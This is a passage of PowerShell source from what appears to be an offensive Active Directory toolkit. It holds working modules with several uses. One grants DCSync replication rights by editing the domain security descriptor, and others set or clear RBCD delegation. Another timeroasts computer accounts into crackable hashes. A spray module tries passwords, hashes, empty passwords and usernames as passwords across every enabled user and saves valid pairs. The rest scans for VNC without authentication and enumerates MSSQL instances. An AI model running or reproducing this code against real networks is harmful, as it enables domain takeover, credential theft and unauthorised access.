                        $SdBytes = $DomainEntry.Attributes["nTSecurityDescriptor"][0]
                        $Sd = New-Object System.Security.AccessControl.RawSecurityDescriptor($SdBytes, 0)
        	
                        $Result += "[*] Retrieved current security descriptor`n"
                    }
                
                    catch { $Result += "[!] Error: retrieving domain security descriptor: $_`n" ; return $Result }
        	
                    # Define DCSync GUIDs
                    $GetChangesGuid = [Guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
                    $GetChangesAllGuid = [Guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
        	
                    # Create ACEs
                    $Ace1 = New-Object System.Security.AccessControl.ObjectAce(
                        [System.Security.AccessControl.AceFlags]::None,
                        [System.Security.AccessControl.AceQualifier]::AccessAllowed,
                        0x100,
                        $UserSid,
                        [System.Security.AccessControl.ObjectAceFlags]::ObjectAceTypePresent,
                        $GetChangesGuid,
                        [Guid]::Empty,
                        $false,
                        $null
                    )
        	
                    $Ace2 = New-Object System.Security.AccessControl.ObjectAce(
                        [System.Security.AccessControl.AceFlags]::None,
                        [System.Security.AccessControl.AceQualifier]::AccessAllowed,
                        0x100,
                        $UserSid,
                        [System.Security.AccessControl.ObjectAceFlags]::ObjectAceTypePresent,
                        $GetChangesAllGuid,
                        [Guid]::Empty,
                        $false,
                        $null
                    )
        	
                    # Add ACEs to DACL
                    $Sd.DiscretionaryAcl.InsertAce(0, $Ace1)
                    $Sd.DiscretionaryAcl.InsertAce(0, $Ace2)
            	
                    $Result += "[*] Added DCSync ACEs to security descriptor`n"
        	
                    # Convert security descriptor to byte array
                    $NewSd = New-Object byte[] $Sd.BinaryLength
                    $Sd.GetBinaryForm($NewSd, 0)
        	
                    $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($DomainDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, "nTSecurityDescriptor", $NewSd)
        	
                    #Write-Output "[*] Attempting to modify domain security descriptor"
                    $ModifyResponse = $LdapConnection.SendRequest($ModifyRequest)
                    
                    if ($ModifyResponse.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) { return "[!] Failed to modify security descriptor: $($ModifyResponse.ResultCode)" }
                    else { $Result += "[+] Successfully granted DCSync rights to $ObjectToElevate`n" ; return $Result }
                
                
                }

                elseif ($Module -eq "AddRBCD") {
        
        
                    try {
                
                        $SearchRequest = New-Object System.DirectoryServices.Protocols.SearchRequest($TargetDN, "(objectClass=*)", [System.DirectoryServices.Protocols.SearchScope]::Base, "msDS-AllowedToActOnBehalfOfOtherIdentity")
                        $SearchResponse = $LdapConnection.SendRequest($SearchRequest)
        
                        if ($SearchResponse.Entries.Count -gt 0 -and $SearchResponse.Entries[0].Attributes["msDS-AllowedToActOnBehalfOfOtherIdentity"]) {
                            return "Value msDS-AllowedToActOnBehalfOfOtherIdentity already exists. Use -Module RemoveRBCD to clear the value first"
                        }
                
                        $Rsd = New-Object Security.AccessControl.RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID)")
                        $Rsdb = New-Object byte[] ($Rsd.BinaryLength)
                        $Rsd.GetBinaryForm($Rsdb, 0)
        
                        $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                        $Modification.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity"
                        $Modification.Add($Rsdb) > $null
                        $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
        	
                        $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($TargetDN, $Modification)
        
                        try {
                            $LdapConnection.SendRequest($ModifyRequest) > $null
                            return "[+] msDS-AllowedToActOnBehalfOfOtherIdentity successfully added on ""$TargetDN"" for SID: $SID"
                        }
                
                        catch { return "Error: $_" }
                    }
            
                    catch { return "Error: $_" }
                }

                elseif ($Module -eq "RemoveRBCD") {

                    $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                    $Modification.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity"
                    $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete
                    $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($TargetDN, $Modification)
            	
                    $LdapConnection.SendRequest($ModifyRequest) > $null
                    return "[+] msDS-AllowedToActOnBehalfOfOtherIdentity Removed from $TargetDN"
                }

                elseif ($Module -eq "timeroast") {

                    Function Invoke-AuthenticatedTimeRoast {

                        param(
                            [Parameter(Mandatory = $true)]
                            [string]$DomainController,
                            [int]$Rate = 180,
                            [int]$Timeout = 24
                        )

                        $ErrorActionPreference = "Stop"
                        $NtpPrefix = [byte[]]@(0xdb, 0x00, 0x11, 0xe9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe1, 0xb8, 0x40, 0x7d, 0xeb, 0xc7, 0xe5, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe1, 0xb8, 0x42, 0x8b, 0xff, 0xbf, 0xcd, 0x0a)

                        $Client = New-Object System.Net.Sockets.UdpClient
                        $Client.Client.ReceiveTimeout = [Math]::Floor(1000 / $Rate)
                        $Client.Connect($DomainController, 123)

                        function Get-ComputerRids {
                            param([string]$DomainController)

                            $Searcher = New-Object System.DirectoryServices.DirectorySearcher
                            $Searcher.SearchRoot = "LDAP://$DomainController"
                            $Searcher.Filter = "(&(objectCategory=computer))"
                            $Searcher.PageSize = 1000
                            $Searcher.PropertiesToLoad.AddRange(@("sAMAccountName", "objectSID"))

                            $Computers = @()
                            
                            foreach ($Result in $Searcher.FindAll()) {
            
                                try {
                
                                    $SamAccountName = $Result.Properties["sAMAccountName"][0]
                                    $Sid = New-Object System.Security.Principal.SecurityIdentifier($Result.Properties["objectsid"][0], 0)
                                    $Rid = [int]$Sid.Value.Split("-")[-1]

                                    $Computers += [PSCustomObject]@{
                                        Name = $SamAccountName
                                        RID  = $Rid
                                    }
                                }
            
                                catch { continue }
                            }

                            return $Computers
                        }

                        $Computers = Get-ComputerRids -DomainController $DomainController
                        $TimeoutTime = (Get-Date).AddSeconds($Timeout)

                        $WordlistPath = "$Timeroast\.Wordlist.txt"
                        Remove-item $WordlistPath -force -ErrorAction "SilentlyContinue"

                        foreach ($Computer in $Computers) {
            
                            $Name = $Computer.Name.TrimEnd('$').ToLower()
                            $Name | Out-File -Append -FilePath $WordlistPath -Encoding "ascii"
        
                        }

                        foreach ($Computer in $Computers) {
                            
                            $Rid = $Computer.RID
                            $Query = $NtpPrefix + [BitConverter]::GetBytes($Rid) + [byte[]]::new(16)

                            [void] $Client.Send($Query, $Query.Length)

                            try {
                                
                                $Reply = $Client.Receive([ref]$null)

                                if ($Reply.Length -eq 68) {
                
                                    $Salt = [byte[]]$Reply[0..47]
                                    $Md5Hash = [byte[]]$Reply[-16..-1]
                                    $AnswerRid = [BitConverter]::ToUInt32($Reply[-20..-16], 0)

                                    $HexSalt = [BitConverter]::ToString($Salt).Replace("-", "").ToLower()
                                    $HexHash = [BitConverter]::ToString($Md5Hash).Replace("-", "").ToLower()
                
                                    $ComputerHostname = $Computer.Name.TrimEnd('$')
                                    $HashcatHash = "$ComputerHostname`:`$sntp-ms`${0}`${1}" -f $HexHash, $HexSalt

                                    Write-Output $HashcatHash
                                    $TimeoutTime = (Get-Date).AddSeconds($Timeout)
                                
                                }
                            }
        
                            catch { continue }
                        }

                        return $Result
                        $Client.Close()
                    }

                    $Timestamp = Get-Date -Format o | ForEach-Object { $_ -replace ":", "." }

                    if ($ShowOutput) {
                    
                        return Invoke-AuthenticatedTimeRoast -DomainController $ComputerName  | Out-string | Sort-Object | Tee-Object "$Timeroast\$Timestamp.txt"

                    }

                    else {
                     
                        return Invoke-AuthenticatedTimeRoast -DomainController $ComputerName  | Out-string | Sort-Object | Out-File "$Timeroast\$Timestamp.txt"

                    }

                } 
            }
            
            catch { return "Error: $_" }
            finally { if ($LdapConnection) { $LdapConnection.Dispose() } }
        }


        foreach ($computer in [array]$Computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }

            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Username).AddArgument($Password).AddArgument($LocalAuth).AddArgument($Timeout).AddArgument($Module).AddArgument($TargetDN).AddArgument($GroupDN).AddArgument($SID).AddArgument($LDAPS).AddArgument($Timeroast).AddArgument($ShowOutput)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }


        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {

                if ($runspace.Handle.IsCompleted) {
                    
                    $runspace.Completed = $true
                    $result = $null
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)[0]
                    $Cleanup = $runspace.Runspace.EndInvoke($runspace.Handle)[1]
                    $Class = $runspace.Runspace.EndInvoke($runspace.Handle)[2]
                    $hasDisplayedResult = $false
                    
                    try {
                        # remove later?
                        #$result = $result.Trim()
                    }
                    
                    catch {}

                    if ($result -eq "Unable to connect") { continue }

                    if ($result -like "Error:*") {

                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText $result -NameLength $NameLength -OSLength $OSLength
                        continue

                    }

                    else {
                    
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength

                        ""
                        $result | Write-Output

                    }


                    # Dispose of runspace and close handle
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })


        $runspacePool.Close()
        $runspacePool.Dispose()
    }


    ################################################################################################################
    ################################################## Function: Spray #############################################
    ################################################################################################################
    Function Method-Spray {
        
        Write-host

        # Create a directory entry for the specified domain
        $directoryEntry = [ADSI]"LDAP://$domain"
        $searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
        $searcher.PropertiesToLoad.AddRange(@("lockoutThreshold"))

        # Set the filter to query the domainDNS object
        $searcher.Filter = "(objectClass=domainDNS)"
        $domainObject = $searcher.FindOne()

        if ($domainObject.Properties.Contains("lockoutThreshold")) {
            $lockoutThreshold = $domainObject.Properties["lockoutThreshold"][0]
            # Check the lockout threshold value
            $LO_threshold = $lockoutThreshold

            if ($LO_threshold -eq "0") {
                $SafeLimit = 100000
            }
            elseif ($LO_threshold -lt 3) {
                Write-Host
                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-Host "Lockout threshold is 2 or less. Aborting..."
                return
            }
            elseif ($LO_threshold -lt 4) {
                $SafeLimit = 1
            }
            else {
                $SafeLimit = $LO_threshold - 2
            }
        }
        else {
            
            Write-Host
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Threshold not found. Aborting..."
            return
        }
        
        # gut this out and replace with the new function
        $searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)

        # Display the $SafeLimit value
        Write-Output " - Lockout Threshold  : $LO_threshold"
        Write-Output " - Safety Limit value : $SafeLimit"
        Write-Output " - Removed disabled accounts from spraying"

        if ($SprayHash -ne "") {
            Write-Host
            $SprayPassword = ""
            $AccountAsPassword = $False

            if ($SprayHash.Length -ne 32 -and $SprayHash.Length -ne 64 -and $SprayHash.Length -ne 65) {
                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-Host "Supply either a 32-character RC4/NT hash, 64-character AES256 hash or a NTLM hash"
                Write-Host 
                return
            }

            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Spraying with Hash value: $SprayHash"
            if ($SprayHash.Length -eq 64) {
            
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "AES hashes are salted and unlikely to be valid for more than a single account"
            
            }
            
            Write-Host

        }

        if ($Pre2k) {          
            $SprayHash = ""
            $SprayPassword = ""
            $AccountAsPassword = $False

            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Spraying for Pre2k accounts."
            Write-Host

        }

        if ($SprayPassword -ne "") {
            $SprayHash = ""
            $AccountAsPassword = $False

            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Spraying with password value: $SprayPassword"
            Write-Host

        }

        if ($AccountAsPassword) {
            $SprayHash = ""
            $SprayPassword = ""

            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Spraying usernames as passwords"
            Write-Host
        }

        if ($EmptyPassword) {
            $SprayPassword = ""
            $SprayHash = ""
            $AccountAsPassword = $False     
    
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Spraying empty passwords"
            Write-Host
        }

        
        $SuccessUsers = @()
        
        # Add Bloodhound queries to this at a later date
        if ($Pre2k) {
        Write-Host

            foreach ($Computer in $ComputerSamAccounts) {

                $Pre2kName = $Computer.ToString()
                $Pre2kName = $Pre2kName.Trim('$').ToLower()
                $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", "$Domain\$Pre2kName", "$Pre2kName")
        
                if ($Attempt.name -ne $null) {
                    Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                    Write-Host "$Domain\$Pre2kName"
                        
                    $SuccessfulUser = "$Domain\$Pre2kName"
                    $SuccessUsers += $SuccessfulUser
                        
                    "$Domain\${Pre2kName}:$Pre2kName" | Out-file -FilePath "$Spraying\$Domain-Pre2k.txt" -Encoding "Unicode" -Append
                }

                elseif (!$SuccessOnly) {
                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                    Write-Host "$Domain\$Pre2kName"
                }

            }

            if ("$Spraying\$Domain-Pre2k.txt"){

                (Get-Content "$Spraying\$Domain-Pre2k.txt" -ErrorAction "SilentlyContinue" | Where-Object { $_.Trim() -ne "" } | Sort-Object -Unique) | Set-Content "$Spraying\$Domain-Pre2k.txt" -Force

            } 

        }

        else {
        
            foreach ($UserToSpray in $EnabledDomainUsers) {
                $Delay = Get-Random -Minimum 5 -Maximum 20
                Start-Sleep -Milliseconds $Delay

                Write-Log -Message  "Querying user $UserToSpray from LDAP"

                try {
                    $searcher.Filter = "(&(objectCategory=person)(objectClass=user)(samAccountName=$UserToSpray))"
                    $searchResult = $searcher.FindOne()
                    $badPwdCount = $searchResult.Properties["badPwdCount"][0]  

                    if ($badPwdCount -ge $SafeLimit) {
                        if (!$SuccessOnly) {
                            Write-Host "[/] " -ForegroundColor "Magenta" -NoNewline
                            Write-Host "$Domain\$UserToSpray - Safe threshold met"
                            continue
                        }
                    }
                    # Hash Spraying
                    if ($SprayHash -ne "") {
                        if ($SprayHash.Length -eq 32) { $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /rc4:$SprayHash /domain:$domain /force /opsec | Out-String }
                        elseif ($SprayHash.Length -eq 64) { $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /aes256:$SprayHash /domain:$domain /enctype:aes256 | Out-String }
                        elseif ($SprayHash.Length -eq 65) {
                            $colonCount = ($SprayHash.ToCharArray() | Where-Object { $_ -eq ':' }).Count
                            if ($colonCount -ne 1) {
                                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                                Write-Host "Ensure the provided value for the NTLM hash is formed as LM:NT"
                                Write-Host "Example: aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe"
                                break
                            }
                    
                            $SprayHash = $SprayHash.Split(':')[1]
                            $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /rc4:$SprayHash /domain:$domain /force /opsec | Out-String
                        }

                        # Check for Unhandled exception
                        if ($Attempt.IndexOf("Unhandled rTickets exception:") -ne -1) {
                            if (!$SuccessOnly) {
                                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                                Write-Host "$Domain\$UserToSpray"
                            }    
                        } 
                        # Check for KDC_ERR_PREAUTH_FAILED
                        elseif ($Attempt.IndexOf("KDC_ERR_PREAUTH_FAILED") -ne -1) {
                            if (!$SuccessOnly) {
                                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                                Write-Host "$Domain\$UserToSpray"
                            }   
                        }
					
                        # Check for RC4 Errors
                        elseif ($Attempt.IndexOf("NOTSUPP") -ne -1) {
                            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                            Write-Host "$Domain\$UserToSpray - RC4 type not supported"
                        }
					
                        # Check for a value that only appears in a success status
                        elseif ($Attempt.IndexOf("NameService              :") -ne -1) {
                            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                            Write-Host "$Domain\$UserToSpray"

                            $SuccessfulUser = "$Domain\$UserToSpray"
                            $SuccessUsers += $SuccessfulUser
                        
                            "$Domain\${UserToSpray}:$SprayHash" | Out-file -FilePath "$Spraying\$Domain-Hashes-Users.txt" -Encoding "ASCII" -Append
                            Append-BHQuery -Username $UserToSpray -Domain $Domain -UserOwned
                            if ($SprayHash.Length -eq 64) { Append-BHQuery -Username $UserToSpray -Domain $Domain -AES256 $SprayHash -AESProperty }
                            elseif ($SprayHash.Length -eq 32) { Append-BHQuery -Username $UserToSpray -Domain $Domain -RC4 $SprayHash -RC4Property }
                        
                        }
                    }

                    # Password Spraying
                    if ($SprayPassword -ne "") {
                    
                    
                        $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", "$Domain\$UserToSpray", "$SprayPassword")
        
                        if ($Attempt.name -ne $null) {
                            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                            Write-Host "$Domain\$UserToSpray"
                        
                            $SuccessfulUser = "$Domain\$UserToSpray"
                            $SuccessUsers += $SuccessfulUser
                        
                            "$Domain\${UserToSpray}:$SprayPassword" | Out-file -FilePath "$Spraying\$Domain-Password-Users.txt" -Encoding "ASCII" -Append
                            Append-BHQuery -Username $UserToSpray -Domain $Domain
                            Append-BHQuery -Username $UserToSpray -Domain $Domain -Password $SprayPassword -PasswordProperty
                        }

                        elseif (!$SuccessOnly) {
                            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                            Write-Host "$Domain\$UserToSpray"
                        }
                    }
                    # Account as password
                    if ($AccountAsPassword) {

                        $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", "$Domain\$UserToSpray", "$UserToSpray")
        
                        if ($Attempt.name -ne $null) {
                            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                            Write-Host "$Domain\$UserToSpray"
                        
                            $SuccessfulUser = "$Domain\$UserToSpray"
                            $SuccessUsers += $SuccessfulUser
                        
                            "$Domain\${UserToSpray}:$UserToSpray" | Out-file -FilePath "$Spraying\$Domain-AccountAsPassword-Users.txt" -Encoding "ASCII" -Append
                            Append-BHQuery -Username $UserToSpray -Domain $Domain -UserOwned
                            Append-BHQuery -Username $UserToSpray -Domain $Domain -Password $UserToSpray -PasswordProperty
                        }

                        elseif (!$SuccessOnly) {
                            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                            Write-Host "$Domain\$UserToSpray"
                        }
    
                    }

                    # EmptyPasswords
                    if ($EmptyPassword) {
                        $SprayPassword = ""
       
                        $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", "$Domain\$UserToSpray", "$SprayPassword")
        
                        if ($Attempt.name -ne $null) {
                            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                            Write-Host "$Domain\$UserToSpray"
                        
                            $SuccessfulUser = "$Domain\$UserToSpray"
                            $SuccessUsers += $SuccessfulUser
                        
                            "$Domain\${UserToSpray}" | Out-file -FilePath "$Spraying\$Domain-EmptyPassword-Users.txt" -Encoding "ASCII" -Append
                            Append-BHQuery -Username $UserToSpray -Domain $Domain -Password "Empty Password" -PasswordProperty
                        }

                        elseif (!$SuccessOnly) {
                            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                            Write-Host "$Domain\$UserToSpray"
                        }
                    }
                }
                catch {
        
                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                    Write-Host "$Domain\$UserToSpray - Exception occurred: $($_.Exception.Message)"
        
                }
            }

        }

        
        if ($SuccessUsers.Count -gt 0 ) {
            Write-Host
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Valid credential pairs `n " -NoNewline
            if (!$SuccessOnly) { Write-Host } Else {}

            if (!$SuccessOnly) {
                foreach ($User in $SuccessUsers) {
                    Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                    Write-Host "$User"
                
                }
            }
            
            if (!$SuccessOnly) { Write-Host } Else {}
            Write-Host "[*] " -ForegroundColor "Yellow" -no
            Write-Host "Output written to $Spraying"
            Write-Host
        }

        elseif ($SuccessUsers.Count -eq 0 ) {
            Write-Host
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "No valid credential pairs found"
            Write-Host
        }
 
        if (Test-Path "$Spraying\$Domain-EmptyPassword-Users.txt") {
            $Unique = Get-Content "$Spraying\$Domain-EmptyPassword-Users.txt" -Verbose | Sort-Object -Unique
            $Unique | Set-Content "$Spraying\$Domain-EmptyPassword-Users.txt" -Force
            
        }

        if (Test-Path "$Spraying\$Domain-AccountAsPassword-Users.txt") {
            $Unique = Get-Content "$Spraying\$Domain-AccountAsPassword-Users.txt" -Verbose | Sort-Object -Unique
            $Unique | Set-Content "$Spraying\$Domain-AccountAsPassword-Users.txt" -Force
            
        }

        if (Test-Path "$Spraying\$Domain-Password-Users.txt") {
            $Unique = Get-Content "$Spraying\$Domain-Password-Users.txt" -Verbose | Sort-Object -Unique
            $Unique | Set-Content "$Spraying\$Domain-Password-Users.txt" -Force
            
        }

        if (Test-Path "$Spraying\$Domain-Hashes-Users.txt") {
            $Unique = Get-Content "$Spraying\$Domain-Hashes-Users.txt" -Verbose | Sort-Object -Unique
            $Unique | Set-Content "$Spraying\$Domain-Hashes-Users.txt"
            
        }

        [int]$SuccessUsersInt = $SuccessUsers.Count
        if ($SuccessUsers -gt 0 ) { [int]$Global:SuccessCount = [int]$SuccessUsersInt }
        else { $Global:SuccessCount = 0 }
 
    }

    ################################################################################################################
    ################################################## Function: VNC ###############################################
    ################################################################################################################
    Function Method-VNC {

        if ($Port -eq "") { $Port = "5900" } else { $Port = $Port }

        # Create a runspace pool
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($ComputerName, $Port, $Timeout)

            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, $Port, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

            if ($wait) { 
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            if (!$connected) { $tcpClient.Close() ; return }

            function VNC-NoAuth {
                param(
                    [string]$ComputerName,
                    [int]$Port
                )
                try {
                    $tcpClient = New-Object System.Net.Sockets.TcpClient($ComputerName, $Port)
                }
                catch {
                    Write-Host "Error: Unable to connect to $ComputerName on port $Port"
                    return "Connection Error"
                }

                try {
                    $networkStream = $tcpClient.GetStream()
                    $networkStream.ReadTimeout = 50
        
                    # Reading Version from Server
                    $buffer = New-Object byte[] 12
                    $read = $networkStream.Read($buffer, 0, 12)
                    if ($read -eq 0) { throw "No data received from the server" }
                    $serverVersionMessage = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $read)
        
                    # Sending Client Version
                    $buffer = [System.Text.Encoding]::ASCII.GetBytes($serverVersionMessage)
                    $networkStream.Write($buffer, 0, $buffer.Length)

                    # Reading Supported Security Types
                    $buffer = New-Object byte[] 2
                    $read = $networkStream.Read($buffer, 0, 1)
                    if ($read -eq 0) { throw "No data received from the server" }
                    $numberOfSecTypes = $buffer[0]
                    $buffer = New-Object byte[] $numberOfSecTypes
                    $read = $networkStream.Read($buffer, 0, $numberOfSecTypes)
                    if ($read -eq 0) { throw "No data received from the server" }
                }
                catch {
                    Write-Host "Error: Handshake failed with $ComputerName on port $Port"
                    return "Handshake Error"
                }
                finally {
                    # Cleanup
                    if ($null -ne $networkStream) { $networkStream.Close() }
                    if ($null -ne $tcpClient) { $tcpClient.Close() }
                }

                # Check for Non-authentication (Type 1)
                if ($buffer -contains 1) {
                    return "Supported"
                }
                else {
                    return "Not Supported"
                }
            }

            $AuthSupported = VNC-NoAuth -ComputerName $ComputerName -Port $Port
            return "$AuthSupported"
        }

        # Create and invoke runspaces for each computer
        foreach ($computer in [array]$Computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }
    
            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Port).AddArgument($Timeout)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        [int]$Global:SuccessCount = 0
        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)

                    if ($result -eq "Not Supported") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "AUTH REQUIRED" -NameLength $NameLength -OSLength $OSLength
                        continue
                    } 

                    if ($result -eq "Handshake Error") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "HANDSHAKE ERROR" -NameLength $NameLength -OSLength $OSLength
                        continue
                    } 
                    elseif ($result -eq "Supported") {
                        $SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "AUTH NOT REQUIRED" -NameLength $NameLength -OSLength $OSLength
                        $($runspace.ComputerName) | Out-File -FilePath "$VNC\.VNC-Non-Auth.txt" -Encoding "ASCII" -Append
                    } 

                    # Dispose of runspace and close handle
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })

        Get-Content -Path "$VNC\.VNC-Non-Auth.txt" -ErrorAction "SilentlyContinue" | Sort-Object | Get-Unique | Set-Content -Path "$VNC\.VNC-Non-Auth.txt" -ErrorAction "SilentlyContinue"

        $runspacePool.Close()
        $runspacePool.Dispose()

    }

    ################################################################################################################
    ################################################## Function: MSSQL #############################################
    ################################################################################################################
    Function Method-MSSQL {

        Add-Type -AssemblyName "System.Data"

        # Create a runspace pool
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($ComputerName, $MSSQL, $IPAddress)

            function Send-UdpDatagram {
                param ([string]$ComputerName)

                $client = New-Object net.sockets.udpclient(0)
                $client.Client.ReceiveTimeout = 100

                $send = [Byte] 0x03
                try { [void] $client.send($send, $send.length, $ComputerName, 1434) }
                Catch { return "Unable to connect" }

                $ipep = New-Object net.ipendpoint([net.ipaddress]::any, 0)
                $receive = $null
                try {
                    $receive = $client.receive([ref]$ipep)
                }
                catch [System.Net.Sockets.SocketException] { return "Unable to connect" } 
                finally {
                    try { $client.close() } Catch {}
                }

                $rawData = [text.encoding]::ascii.getstring($receive)
                $instanceFullNames = @()

                $rawData -split ';;' | ForEach-Object {
                    if ($_ -match 'InstanceName;([^;]+)') {
                        $instanceName = $matches[1]
                        $instanceFullNames += "$ComputerName\$instanceName"
                    }
                }

                $instanceFullNames
            }

            return  Send-UdpDatagram -ComputerName $ComputerName

        }

        foreach ($computer in [array]$Computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = $Computer
            }

            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Port).AddArgument($MSSQL).AddArgument($timeout).AddArgument($IPAddress)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        $AllInstances = @()

        function New-Searcher {
            $directoryEntry = [ADSI]"LDAP://$domain"
            $searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
            $searcher.PageSize = 1000
            return $searcher
        }

        function Get-ADSQLInstances {
            param(
                [Parameter(Mandatory = $false)]
                [string]$LDAPFilter = "(servicePrincipalName=MSSQLSvc/*)"
            )

            # Initialize an empty array to hold all instances
            $AllInstances = @()

